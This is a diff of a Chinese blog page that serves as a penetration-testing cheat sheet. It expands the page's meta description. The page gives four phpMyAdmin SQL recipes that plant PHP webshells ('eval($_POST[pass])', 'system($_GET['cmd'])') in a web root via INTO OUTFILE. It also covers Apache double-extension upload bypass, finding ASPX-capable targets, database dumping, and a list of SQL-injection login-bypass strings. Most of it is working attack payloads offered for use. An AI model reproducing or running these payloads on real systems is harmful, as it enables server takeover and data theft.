@@ -6,7 +6,23 @@
   <title>渗透学习第一阶段总结[2] | xiaofeng&#39;s Blog</title>
   <meta name="author" content="xiaofeng">
   
-  <meta name="description" content="0x00 linux解析格式：1.php.xxx (xxx可以是任意)如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。辨别linux系统方法，例如：http://www.xxx.com/xxx/abc.asp?id=125 把b换成大">
+  <meta name="description" content="0x00 linux解析格式：1.php.xxx (xxx可以是任意)如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。辨别linux系统方法，例如：http://www.xxx.com/xxx/abc.asp?id=125 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统
+0x01 旁注旁注的技巧就是挑选支持aspx的站来日，这样提权时候希望较大，如何探测服务器上哪些站点支持aspx呢? 利用bing搜索：http://cn.bing.com/ 搜索格式：ip:服务器ip aspx比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。
+0x02 phpmyadmin查看版本：test.php 或 phpinfo.php默认账号密码：root root万能帐号密码：’localhost’@’@” 密码空拿shell第一种方法：
+CREATE TABLE `mysql`.`darkmoon` (`darkmoon1` TEXT NOT NULL );
+INSERT INTO `mysql`.`darkmoon` (`darkmoon1` ) VALUES (&amp;apos;&amp;lt;?php @eval($_POST[pass]);?&amp;gt;&amp;apos;);
+SELECT `darkmoon1` FROM `darkmoon` INTO OUTFILE &amp;apos;d:/wamp/www/darkmoon.php&amp;apos;;
+DROP TABLE IF EXISTS `darkmoon`;
+拿shell第二种方法：
+Create TABLE moon (darkmoon text NOT NULL);
+Insert INTO moon (darkmoon) VALUES(&amp;apos;&amp;lt;?php @eval($_POST[pass]);?&amp;gt;&amp;apos;);
+select darkmoon from moon into outfile &amp;apos;d:/wamp/www/darkmoon2.php&amp;apos;;
+Drop TABLE IF EXISTS moon;
+拿shell第三种方法：
+select &amp;apos;&amp;lt;?php @eval($_POST[pass]);?&amp;gt;&amp;apos;INTO OUTFILE &amp;apos;d:/wamp/www/darkmoon3.php&amp;apos;
+拿shell第四种方法
+select &amp;apos;&amp;lt;?php echo \&amp;apos;&amp;lt;pre&amp;gt;\&amp;apos;;system($_GET[\&amp;apos;cmd\&amp;apos;]); echo \&amp;apos;&amp;lt;/pre&amp;gt;\&amp;apos;; ?&amp;gt;&amp;apos; INTO OUTFILE &amp;apos;d:/wamp/www/darkmoon4.php&amp;apos;
+127.0.0.1/darkmoon4.php?cmd=net user找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。phpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。修改mysql默认的root用户名方法:进入phpmyadmin,进入mysql表,执行sql语句         1.update user set user=’你的新root用户名’ where user=’root’;         2.flush privileges;例如：用root身份登入，进入mysql库，修改user表即可。         1.use mysql;         2.mysql&amp;gt;update user set user=’newName’ where user=’root’;         3.mysql&amp;gt; flush privileges;">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -82,7 +98,7 @@ Drop TABLE IF EXISTS moon;
 <pre><code>select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;INTO OUTFILE &apos;d:/wamp/www/darkmoon3.php&apos;
 </code></pre><p>拿shell第四种方法</p>
 <pre><code>select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; INTO OUTFILE &apos;d:/wamp/www/darkmoon4.php&apos;
-</code></pre><p>127.0.0.1/darkmoon4.php?cmd=net user<br>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。<br>phpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。<br>修改mysql默认的root用户名方法:<br>进入phpmyadmin,进入mysql表,执行sql语句<br>         1.update user set user=’你的新root用户名’ where user=’root’;<br>         2.flush privileges;<br>例如：<br>用root身份登入，进入mysql库，修改user表即可。<br>         1.use mysql;<br>         2.mysql&gt;update user set user=’newName’ where user=’root’;<br>         3.mysql&gt; flush privileges;   </p>
+</code></pre><p>127.0.0.1/darkmoon4.php?cmd=net user<br>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。<br>phpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。<br>修改mysql默认的root用户名方法:<br>进入phpmyadmin,进入mysql表,执行sql语句<br>         1.update user set user=’你的新root用户名’ where user=’root’;<br>         2.flush privileges;<br>例如：<br>用root身份登入，进入mysql库，修改user表即可。<br>         1.use mysql;<br>         2.mysql&gt;update user set user=’newName’ where user=’root’;<br>         3.mysql&gt; flush privileges;<br><a id="more"></a></p>
 <h2 id="0x03-万能密码"><a href="#0x03-万能密码" class="headerlink" title="0x03 万能密码"></a>0x03 万能密码</h2><pre><code>&apos;xor
 &apos;or&apos;=&apos;or&apos;
 &apos;or&apos;&apos;=&apos;&apos;or&apos;&apos;=&apos;
@@ -224,7 +240,7 @@ function chencklogin()
 </article>
 
 
-  <h1 class="title">Kommentare</h1>
+  <h1 class="title">Comments</h1>
 
   
       <div id="fb-root"></div>
